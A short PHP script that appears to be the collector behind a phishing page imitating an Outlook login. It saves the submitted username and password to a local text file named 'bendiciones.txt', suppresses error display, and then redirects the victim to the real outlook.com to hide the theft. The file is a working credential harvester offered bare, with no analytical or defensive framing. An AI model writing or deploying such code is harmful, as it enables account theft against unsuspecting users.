<?php
$nombre_archivo = "bendiciones";
ini_set("display_errors", 0);


if(isset($_POST['uzer']) && isset($_POST['pazz'])){
$file = fopen("".$nombre_archivo.".txt", "a");
fwrite($file, "".$_POST['uzer'].":".$_POST['pazz']."".PHP_EOL);
fclose($file);

echo "<script type='text/javascript'>";
echo "window.location.href='https://outlook.com/';";
echo "</script>";
			
}else{
	echo '<script type="text/javascript">window.location.href = "index.html";</script>';
}
?>